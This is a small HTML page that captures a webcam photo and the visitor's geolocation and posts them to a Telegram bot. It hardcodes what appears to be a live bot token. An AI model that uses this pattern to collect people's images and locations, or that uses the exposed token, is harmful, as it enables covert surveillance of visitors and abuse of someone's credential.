<!DOCTYPE html>
<html>
<head>
  <title>Camera + Location to Telegram</title>
</head>
<body>
  <video id="video" autoplay></video>
  <button onclick="captureAndSend()">Capture & Send</button>
  <script>
    const botToken = '8110393453:AAFWhP0vFwSJobp5GhEe7XjzKiRoorMyg4Y';
    const chatId = '8110393453';

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        document.getElementById('video').srcObject = stream;
      });

    async function captureAndSend() {
      const canvas = document.createElement('canvas');
      const video = document.getElementById('video');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
      const location = await getLocation();

      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob);
      formData.append('caption', `Location: ${location.lat}, ${location.lon}`);

      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData,
      });
      alert('Sent!');
    }

    function getLocation() {
      return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(pos => {
          resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
        }, reject);
      });
    }
  </script>
</body>
</html>
